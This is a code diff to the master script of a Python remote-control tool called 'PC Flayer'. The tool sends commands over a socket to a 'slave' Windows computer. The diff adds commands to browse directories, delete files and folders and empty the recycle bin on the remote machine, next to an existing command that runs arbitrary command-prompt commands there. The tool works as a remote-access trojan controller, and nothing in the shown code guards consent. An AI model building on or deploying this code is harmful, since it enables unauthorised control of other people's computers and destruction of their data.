@@ -3,13 +3,13 @@ import threading
 import time
 import os
 
-version = "1.1.0"
+VERSION = "1.1.3"
 
 #ACTUAL PORT: 5050
 #TEST PORT: 5051
 
 print("________________________________")
-print(f"PC Flayer ™ v{version}")
+print(f"PC Flayer™ v{VERSION}")
 print("(by R3dSourPatch)")
 print("________________________________")
 print("")
@@ -40,10 +40,10 @@ master = None
 conn, addr = None, None
 
 ready = True
+listenEnabled = True
 
 def show_help():
     print("___________________")
-    print("(Coded and designed for Windows 10 computers.)")
     print("Available commands:")
     print("___________________")
     print("[run (command)] - Runs a command prompt command on slave's end")
@@ -60,43 +60,68 @@ def show_help():
     print("[leave] - Closes master.py but still usable if reopened")
     print("[version] - Checks the version of PC Flayer the slave computer is running")
     print("[update] - Updates PC Flayer version on slave computer (update.py file required, restart of master.py required too)")
+    print("[dir $current/$reset/./(path)/(empty)]:")
+    print("    [dir $current] - Shows you current selected directory on slave computer")
+    print("    [dir $reset] - Resets the current selected directory on slave computer")
+    print("    [dir .] - Goes back to previous directory if one is selected")
+    print("    [dir (path)] - Sets selected path on slave computer. (No '/' needed unless you are going directly to a path, for example C:/Program Files x86/.. OR setting a disk, for example D:/ or C:/")
+    print("    [dir (empty)] - Returns a list of all files and directories on current selected directory")
+    print("[remove (file/directory)] - Deletes the file/directory from slave computer (dir command needed)")
+    print("[trash] - Empties out recycle bin of slave computer")
+    print("___________________")
+    print("Any command argument that is inside parentheses means its user-choice, and (empty) means if no argument is provided.")
     print("___________________")
 
 def listen():
     global ready
+    global listenEnabled
     while True:
         received = conn.recv(2048)
-        message = received.decode()
-        args = message.split(" ")
-        if args[0] == "$approved":
-            ready = True
-            continue
-        elif args[0] == "$error":
-            print("[ERROR] There was an error executing command on slave's end")
-            ready = True
-            continue
-        elif args[0] == "$updated":
-            print("[UPDATE] Update has successfully finished in slave's end")
-            ready = False
-            continue
+        if listenEnabled == True:
+            message = received.decode()
+            args = message.split(" ")
+            if args[0] == "$approved":
+                ready = True
+                continue
+            elif args[0] == "$error":
+                print("[ERROR] There was an error executing command on slave's end")
+                ready = True
+                continue
+            elif args[0] == "$updated":
+                print("[UPDATE] Update has successfully finished in slave's end")
+                ready = False
+                continue
+            elif args[0] == "$listenStop":
+                listenEnabled = False
+                continue
+            else:
+                print(f'[{addr[0]}] "{message}"')
+                continue
         else:
-            print(f'[RESPONSE] "{message}"')
             continue
         
 
 def send():
     global ready
+    global listenEnabled
     while True:
         time.sleep(1)
         if ready == True:
             try:
-                command = input("[COMMAND] Enter a command or type 'help': ")
+                cmdInput = input("[COMMAND] Enter a command or type 'help': ")
+                command = cmdInput.split(" ")
+                command = command[0]
                 if command == "help":
                     show_help()
                     continue
                 elif command == "leave":
                     os._exit(1)
                     return
+                elif command == "version":
+                    print(f"[PC FLAYER] Master computer PC Flayer version: v{VERSION}")
+                    to_send = cmdInput.encode()
+                    conn.send(to_send)
+                    ready = False
                 elif command == "update":
                     if os.path.exists("update.py"):
                         conn.send("update".encode())
@@ -124,8 +149,8 @@ def send():
                         ready = True
                         continue
                 else:
-                    command = command.encode()
-                    conn.send(command)
+                    to_send = cmdInput.encode()
+                    conn.send(to_send)
                     ready = False
             except:
                 print("[ERROR] There was an error sending the command")
